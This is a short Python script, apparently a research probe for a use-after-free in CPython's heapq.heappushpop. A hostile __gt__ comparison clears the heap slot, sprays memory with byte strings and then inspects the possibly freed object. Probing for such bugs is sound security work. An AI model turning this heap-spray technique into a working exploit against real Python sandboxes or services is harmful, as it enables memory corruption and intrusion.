import heapq
import sys

# Try to use the UAF by accessing the 'other' argument inside __gt__
class Evil:
    def __gt__(self, other):
        # 'other' is the object from heap[0]
        # It was passed here without INCREF in heappushpop
        # Let's drop the reference from the list
        heap[0] = None
        
        # At this point, if it had no other references, its refcount should be 0!
        # But wait, it's currently bound to the local variable 'other'.
        # Does the frame hold a strong reference?
        # Let's check its refcount
        rc = sys.getrefcount(other)
        print(f'refcount of other inside __gt__: {rc}')
        
        # If the refcount is low enough, maybe it got deallocated?
        # Let's see if we can reclaim its memory.
        global spray
        spray = [bytes(b'A' * 48) for _ in range(100)]
        
        # Try to access 'other' - if it's freed and reclaimed, it might crash or show different data!
        try:
            print(f'other type: {type(other)}')
            print(f'other repr: {repr(other)}')
        except Exception as e:
            print(f'Error accessing other: {e}')
            
        return True

class Target:
    def __init__(self, val):
        self.val = val
    def __repr__(self):
        return f'Target({self.val})'

# Create target and put in heap
heap = [Target(42)]
# Remove any other references
evil = Evil()

print('Calling heappushpop...')
heapq.heappushpop(heap, evil)
print('Done')
